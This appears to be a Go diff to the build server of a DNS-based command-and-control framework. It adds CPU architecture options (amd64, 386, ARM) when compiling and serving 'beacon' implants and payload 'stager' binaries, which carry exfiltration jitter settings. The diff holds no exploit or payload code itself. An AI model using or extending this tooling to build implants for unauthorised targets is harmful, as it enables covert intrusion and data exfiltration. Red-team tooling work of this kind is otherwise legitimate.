@@ -42,6 +42,7 @@ type DNSServerBuildRequest struct {
 type ClientBuildRequest struct {
 	DNSDomains          []string `json:"dns_domains"`
 	Platform            string   `json:"platform"`
+	Architecture        string   `json:"architecture"`
 	SleepMin            int      `json:"sleep_min"`
 	SleepMax            int      `json:"sleep_max"`
 	ExfilJitterMinMs    int      `json:"exfil_jitter_min_ms"`
@@ -54,6 +55,7 @@ type StagerBuildRequest struct {
 	ClientBinaryID string `json:"client_binary_id"` // ID of pre-built client to use
 	Domain         string `json:"domain"`           // Primary DNS domain (for single-server mode)
 	Platform       string `json:"platform"`
+	Architecture   string `json:"architecture"`
 	PayloadURL     string `json:"payload_url"`
 	JitterMinMs    int    `json:"jitter_min_ms"`
 	JitterMaxMs    int    `json:"jitter_max_ms"`
@@ -210,6 +212,24 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 		return
 	}
 
+	// Validate platform
+	if req.Platform == "" {
+		api.sendError(w, http.StatusBadRequest, "platform is required")
+		return
+	}
+
+	// Default to amd64 if architecture not specified
+	if req.Architecture == "" {
+		req.Architecture = "amd64"
+	}
+
+	// Validate architecture
+	validArchs := map[string]bool{"amd64": true, "386": true, "arm": true, "arm64": true, "armv7l": true}
+	if !validArchs[req.Architecture] {
+		api.sendError(w, http.StatusBadRequest, "invalid architecture: must be amd64, 386, arm, arm64, or armv7l")
+		return
+	}
+
 	// Build the client
 	// Build the client with Master's encryption key
 	binaryPath, err := buildClient(req, api.config.SourceDir, api.config.EncryptionKey)
@@ -226,7 +246,7 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 	if req.Platform == "windows" {
 		ext = ".exe"
 	}
-	filename := fmt.Sprintf("beacon-%s-%d%s", req.Platform, time.Now().Unix(), ext)
+	filename := fmt.Sprintf("beacon-%s-%s-%d%s", req.Platform, req.Architecture, time.Now().Unix(), ext)
 	savedPath, err := api.saveBuild(binaryPath, filename, "client")
 	if err != nil {
 		fmt.Printf("Warning: failed to save build: %v\n", err)
@@ -242,7 +262,7 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 
 	// Send binary as download
 	w.Header().Set("Content-Type", "application/octet-stream")
-	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"beacon-%s%s\"", req.Platform, ext))
+	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"beacon-%s-%s%s\"", req.Platform, req.Architecture, ext))
 
 	file, err := os.Open(binaryPath)
 	if err != nil {
@@ -263,6 +283,24 @@ func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) 
 	var req StagerBuildRequest
 	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
 		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	// Validate platform
+	if req.Platform == "" {
+		api.sendError(w, http.StatusBadRequest, "platform is required")
+		return
+	}
+
+	// Default to amd64 if architecture not specified
+	if req.Architecture == "" {
+		req.Architecture = "amd64"
+	}
+
+	// Validate architecture
+	validArchs := map[string]bool{"amd64": true, "386": true, "arm": true, "arm64": true, "armv7l": true}
+	if !validArchs[req.Architecture] {
+		api.sendError(w, http.StatusBadRequest, "invalid architecture: must be amd64, 386, arm, arm64, or armv7l")
 		return
 	}
 
@@ -340,7 +378,7 @@ func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) 
 	if req.Platform == "windows" {
 		ext = ".exe"
 	}
-	filename := fmt.Sprintf("stager-%s-%d%s", req.Platform, time.Now().Unix(), ext)
+	filename := fmt.Sprintf("stager-%s-%s-%d%s", req.Platform, req.Architecture, time.Now().Unix(), ext)
 	savedPath, err := api.saveBuild(binaryPath, filename, "stager")
 	if err != nil {
 		fmt.Printf("Warning: failed to save build: %v\n", err)
@@ -438,7 +476,7 @@ func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) 
 
 	// Send binary as download
 	w.Header().Set("Content-Type", "application/octet-stream")
-	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"stager-%s%s\"", req.Platform, ext))
+	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"stager-%s-%s%s\"", req.Platform, req.Architecture, ext))
 
 	file, err := os.Open(binaryPath)
 	if err != nil {
@@ -674,10 +712,20 @@ func getConfig() Config {
 		goos = "windows"
 	}
 
+	// Map architecture - armv7l uses GOARCH=arm with GOARM=7
+	goarch := req.Architecture
+	env := append(os.Environ(), fmt.Sprintf("GOOS=%s", goos))
+	if req.Architecture == "armv7l" {
+		goarch = "arm"
+		env = append(env, "GOARCH=arm", "GOARM=7")
+	} else {
+		env = append(env, fmt.Sprintf("GOARCH=%s", goarch))
+	}
+
 	outputPath := filepath.Join(buildDir, fmt.Sprintf("beacon%s", ext))
 	cmd := exec.Command("go", "build", "-trimpath", "-ldflags=-s -w", "-o", outputPath, ".")
 	cmd.Dir = buildDir
-	cmd.Env = append(os.Environ(), fmt.Sprintf("GOOS=%s", goos), "GOARCH=amd64")
+	cmd.Env = env
 
 	output, err := cmd.CombinedOutput()
 	if err != nil {
@@ -731,31 +779,55 @@ func buildStager(req StagerBuildRequest, sourceRoot string) (string, error) {
 	// Build using direct gcc/mingw compilation (no make required)
 	ext := ""
 	var cmd *exec.Cmd
-	outputPath := filepath.Join(buildDir, fmt.Sprintf("stager-%s-x64%s", req.Platform, ext))
+
+	// Map architecture for build flags
+	var archFlag string
+	var mingwTarget string
+
+	switch req.Architecture {
+	case "amd64":
+		archFlag = "-m64"
+		mingwTarget = "x86_64-w64-mingw32-gcc"
+	case "386":
+		archFlag = "-m32"
+		mingwTarget = "i686-w64-mingw32-gcc"
+	case "arm64":
+		archFlag = "" // GCC handles this via -march
+		mingwTarget = "aarch64-w64-mingw32-gcc"
+	case "armv7l", "arm":
+		archFlag = "-march=armv7-a"
+		mingwTarget = "arm-linux-gnueabihf-gcc"
+	default:
+		archFlag = "-m64"
+		mingwTarget = "x86_64-w64-mingw32-gcc"
+	}
+
+	outputPath := filepath.Join(buildDir, fmt.Sprintf("stager-%s-%s%s", req.Platform, req.Architecture, ext))
 
 	if req.Platform == "windows" {
 		ext = ".exe"
-		outputPath = filepath.Join(buildDir, fmt.Sprintf("stager-%s-x64%s", req.Platform, ext))
+		outputPath = filepath.Join(buildDir, fmt.Sprintf("stager-%s-%s%s", req.Platform, req.Architecture, ext))
 
 		// Windows: Use mingw-w64 cross-compiler
 		// Windows stagers don't use compression (no -lz needed)
-		cmd = exec.Command("x86_64-w64-mingw32-gcc",
-			"-Wall", "-O2", "-s",
-			"stager.c",
-			"-o", filepath.Base(outputPath),
-			"-lws2_32", "-static")
+		args := []string{"-Wall", "-O2", "-s", "stager.c", "-o", filepath.Base(outputPath), "-lws2_32", "-static"}
+		cmd = exec.Command(mingwTarget, args...)
 	} else {
-		// Linux: Use standard gcc
-		// Try to build with zlib support, but if that fails, we can fallback
-		// Note: zlib.h is needed for Linux builds - install zlib1g-dev if missing
-		cmd = exec.Command("gcc",
-			"-Wall", "-O2", "-s", "-m64",
-			"stager.c",
-			"-o", filepath.Base(outputPath),
-			"-lz")
+		// Linux: Use standard gcc or cross-compiler for ARM
+		args := []string{"-Wall", "-O2", "-s"}
+		if archFlag != "" {
+			args = append(args, archFlag)
+		}
+		args = append(args, "stager.c", "-o", filepath.Base(outputPath), "-lz")
 
-		// TODO: If zlib is not available, could add -D_WIN32 to disable compression
-		// but that's a workaround - better to install zlib1g-dev on build system
+		// Use cross-compiler for ARM, standard gcc for x86
+		if req.Architecture == "armv7l" || req.Architecture == "arm" {
+			cmd = exec.Command("arm-linux-gnueabihf-gcc", args...)
+		} else if req.Architecture == "arm64" {
+			cmd = exec.Command("aarch64-linux-gnu-gcc", args...)
+		} else {
+			cmd = exec.Command("gcc", args...)
+		}
 	}
 
 	cmd.Dir = buildDir
